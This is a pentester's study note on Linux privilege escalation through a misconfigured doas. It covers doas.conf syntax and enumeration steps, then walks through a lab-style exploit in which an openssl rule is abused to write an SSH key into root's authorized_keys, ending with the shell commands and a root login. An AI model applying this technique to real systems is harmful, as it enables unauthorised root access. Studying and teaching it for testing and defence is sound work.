---
created: 21-01-2026
tags:
  - Linux_PrivEsc
  - Linux
---
## `doas`

>**[`doas`](https://github.com/Duncaen/OpenDoas)** is a lightweight alternative to `sudo`, originally developed for OpenBSD.

>[!note] `doas` is common on OpenBSD, Alpine Linux, hardened environments, and minimal containers. It's less documented and **easier to misconfigure**.

- `doas` is designed to be simpler than `sudo` and more secure by default.
- It allows users to execute commands based on rules defined in `/etc/doas.conf`:

```bash
doas <command>
```

`doas` command options:

| Option      | Description                                                                                                   |
| ----------- | ------------------------------------------------------------------------------------------------------------- |
| `-L`        | Clear any persisted authentications from previous invocations, then immediately exit. No command is executed. |
| `-n`        | Non-interactive mode, fail if the matching rule doesn't have the `nopass` option.                             |
| `-s`        | Execute the shell from `SHELL` or `/etc/passwd`.                                                              |
| `-u <user>` | Execute the command as `user`. The default is root.                                                           |

### `doas.conf` syntax

- Each line in `doas.conf` defines a separate rule. 
- Rules have the following format:

```bash
{permit|deny} [options] <identity> [as <target>] [cmd <command>] [args <arguments>]
```

- `permit`|`deny`: The action to be taken if the rule matches.
- `<identity>`: The username to match; groups may be specified by prepending a colon `:`. 
- `as <target>`: The target user the running user is allowed to run the command as. **The default is all users.**
- `cmd <command>`: The command the user is allowed or denied to run. **The default is all commands.** If a relative path is specified, only a restricted `PATH` will be searched. 
- `args <arguments>`: Arguments to the command. The command arguments provided by the user need to match those specified. The keyword `args` alone means that command must be run without any arguments.
- `options` are:

| Option                    | Description                                                                                           |
| ------------------------- | ----------------------------------------------------------------------------------------------------- |
| `nopass`                  | The user is not required to enter a password.                                                         |
| `nolog`                   | Do no log successful command execution to `syslogd`.                                                  |
| `persist`                 | After the user successfully authenticates, do not ask for a password again for some time.             |
| `keepenv`                 | Preserve environment variables (other than those preserved by default).                               |
| `setenv <variable=value>` | Keep or set environment variables for the `doas` environment (other than those preserved by default). |

By default, `doas`, same as `sudo`, creates a new environment for commands to run:
- The following environments are set to the values appropriate for the target user:
	- `HOME`
	- `LOGNAME`
	- `PATH`
	- `SHELL`
	- `USER`
- `DOAS_USER` is set to the name of the user executing `doas`. 
- The variables `DISPLAY` and `TERM` are inherited from the current environment.
## Enumeration

- Identify if `doas` is installed:

```bash
which doas
```

- Inspect configuration file permissions:

```bash
ls -l /etc/doas.conf
```

>[!note] If writable by your user -> instant root.

If any commands are found, try searching it in [`GTFOBins`](https://gtfobins.github.io/) (`sudo` tabs). Privilege escalation logic is the same as with [[sudo_privilege_escalation|sudo_PrivEsc]].
## Exploitation

- Suppose you run as a non-privileged user `john`. You check `doas.conf` and see:

```bash
cat /etc/doas.conf
```
```
permit nopass john as root cmd openssl
```

- This means you can run `openssl` as `root`. In [`GTFOBins`](https://gtfobins.github.io/) you find that you can write to arbitrary files using [`openssh`](https://gtfobins.org/gtfobins/openssl). Though there's no way to get the shell directly, it is possible to escalate privileges. 

- On your attacker machine, generate a pair of SSH keys:

```bash
ssh-keygen -t rsa
```

```bash
Generating public/private rsa key pair.
Enter file in which to save the key (/home/user/.ssh/id_rsa): id_rsa
Enter passphrase for "id_rsa" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in id_rsa
Your public key has been saved in id_rsa.pub
The key fingerprint is:
SHA256:TBdCgSv30NuK/srXZnLKKHbUINZeG42eY7Jdcv1nSO4 user@parrot
The key's randomart image is:
+---[RSA 3072]----+
|       o+..      |
|      .  . .     |
|     . o.o.      |
|    + *o=..      |
|   . = BS* .     |
|      + @ + . .  |
|     . * B   + . |
|    o.+o= =   + o|
|   . +=++*   .Eo |
+----[SHA256]-----+
```

- Then copy the public key and and write it into the `/root/.ssh/authorized_keys` file:

```bash
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCsTbv7/6J4OPKPBf1JCJzk0z0Ay8xRl3cScO+lcBIB7DjphyLBsclEokuBOjNBXM4Mt/TwhKcNOGFKdC7i6I/kgSsJTAUxICEmFqS7D5Y6RcnPVc+Sx9koSLnrdNayfXB1VH6pmBQ89Y2atGoxq7KDmT5fES/ubo4yjahkRqPd17WVthz/1yNS2wJvglv9/qmmNUNnfnPecTlWnZXvBZE6nd/FQj1RbqBx5IXwHa0gymRY9OtyHZS/ZIDgD1+S9LetskgKA08lIK0XRatiHaYWRC69J8IYN1q1LR7nmtavEYDAm5slzwACHpSwa/+5dwTBjpcvA4qeHuIuO+UfiSp4X9n3g8QtgtUPyDFOMQQ4iX6o4wp6YEcpqdPLIkpuZNtetYk/Mq6UiH3IzUxDOif7VB0A9g8chRDJ6LkR3R23aqVaTuUISnBGt7rOshQHWu+hdVOs1Jj1g5BPQ4zCXuvEAOLa3fZj1bVxgZX6HhqQBDxHRkKLbAfBUseGU5MOl90= user@parrot' | doas openssl enc -out /root/.ssh/authorized_keys
```

- Then SSH into the target machine as root using the matching private key, `id_rsa`:

```bash
ssh root@10.66.169.195 -i id_rsa
```

```
The authenticity of host '10.66.169.195 (10.66.169.195)' can't be established.
ED25519 key fingerprint is SHA256:u+cHshV6MKleRbSWX34rMxAM6XuCoZ5ChS98cTrnPns.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.66.169.195' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-89-generic x86_64)

# ...

root@plotted:~# whoami
root
root@plotted:~# 
```

## References and further reading

- [`doas — Arch Wiki`](https://wiki.archlinux.org/title/Doas)
- [`doas.conf — man pages`](https://man.archlinux.org/man/doas.conf.5)
- [`doas — man pages`](https://man.archlinux.org/man/doas.1.en)